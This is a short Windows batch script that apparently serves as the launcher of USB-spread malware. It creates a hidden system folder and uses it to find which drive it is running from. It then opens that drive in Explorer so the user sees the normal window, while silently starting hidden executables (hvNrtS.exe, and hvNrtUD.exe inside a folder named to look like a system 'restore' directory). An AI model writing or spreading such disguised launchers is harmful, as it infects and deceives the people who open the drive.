md hvNrt_pass
attrib +h +s hvNrt_pass
if exist C:\hvNrt_pass start C:\
if exist D:\hvNrt_pass start D:\
if exist F:\hvNrt_pass start F:\
if exist E:\hvNrt_pass start E:\
if exist G:\hvNrt_pass start G:\
if exist H:\hvNrt_pass start H:\
if exist A:\hvNrt_pass start A:\
if exist B:\hvNrt_pass start B:\
if exist i:\hvNrt_pass start I:\
if exist j:\hvNrt_pass start j:\
if exist k:\hvNrt_pass start k:\
if exist l:\hvNrt_pass start l:\
rd hvNrt_pass
set drive=restore{C0AB7B96-992E-482C-93CB-F39B1876CAA1}
if exist \hvNrtS.exe start \hvNrtS.exe
if exist \%drive%\hvNrt_ins\hvNrtUD.exe start \%drive%\hvNrt_ins\hvNrtUD.exe
exit







